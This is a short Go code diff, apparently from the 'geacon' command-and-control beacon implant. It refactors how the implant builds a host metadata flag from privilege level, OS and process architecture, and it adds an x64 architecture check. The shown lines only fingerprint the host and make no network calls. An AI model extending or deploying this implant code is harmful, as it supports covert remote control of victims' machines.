@@ -50,18 +50,16 @@ func GetMetaDataFlag() int {
 	if IsHighPriv() {
 		flagInt += 8
 	}
-	IsOSX64, _ := IsOSX64()
-	if IsOSX64 {
+	isOSX64, _ := IsOSX64()
+	if isOSX64 {
 		flagInt += 4
 	}
-	IsProcessX64, _ := IsProcessX64()
-	if IsProcessX64 {
+	isProcessX64 := IsProcessX64()
+	// there is no need to add 1 when process is x86
+	if isProcessX64 {
 		flagInt += 2
-	} else {
-		flagInt += 1
 	}
 	return flagInt
-	//return 2
 }
 
 func GetComputerName() string {
@@ -76,6 +74,16 @@ func GetComputerName() string {
 		return sHostName[:config.ComputerNameLength]
 	}
 	return sHostName
+}
+
+// it is ok
+func IsProcessX64() bool {
+	if runtime.GOARCH == "amd64" || runtime.GOARCH == "arm64" || runtime.GOARCH == "arm64be" {
+		//util.Println("geacon is x64")
+		return true
+	}
+	//util.Println("geacon is x86")
+	return false
 }
 
 func GetLocalIPInt() uint32 {
